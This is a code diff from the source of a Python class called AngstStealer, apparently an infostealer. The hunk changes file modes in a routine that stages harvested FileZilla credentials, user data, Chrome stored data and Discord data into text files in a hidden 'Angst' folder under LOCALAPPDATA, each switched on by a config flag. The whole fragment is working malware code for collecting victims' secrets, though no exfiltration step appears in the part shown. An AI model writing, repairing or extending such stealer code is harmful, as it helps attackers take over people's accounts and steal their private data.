@@ -66,25 +66,25 @@ class AngstStealer():
         app_data = os.getenv("LOCALAPPDATA")
         temp = os.path.join(app_data, "Angst")
         if self.filezilla.saved != "" and CONFIG["filezilla"] == True:
-            with open(temp + "\\filezilla.txt", "w") as filezilla_file:
+            with open(temp + "\\filezilla.txt", "w+") as filezilla_file:
                 filezilla_file.write(self.filezilla.saved)
                 filezilla_file.flush()
                 filezilla_file.close()
 
         if self.user.userdata != "" and CONFIG["userdata"] == True:
-            with open(temp + "\\user.txt", "w") as user_file:
+            with open(temp + "\\user.txt", "w+") as user_file:
                 user_file.write(self.user.userdata)
                 user_file.flush()
                 user_file.close()
 
         if self.chrome.stored != "" and CONFIG["chrome"] == True:
-            with open(temp + "\\chrome.txt", "w") as chrome_file:
+            with open(temp + "\\chrome.txt", "w+") as chrome_file:
                 chrome_file.write(self.chrome.stored)
                 chrome_file.flush()
                 chrome_file.close()
 
         if self.discord.saved != "" and CONFIG["discord"] == True:
-            with open(temp + "\\discord.txt", "w") as discord_file:
+            with open(temp + "\\discord.txt", "w+") as discord_file:
                 discord_file.write(self.discord.saved)
                 discord_file.flush()
                 discord_file.close()
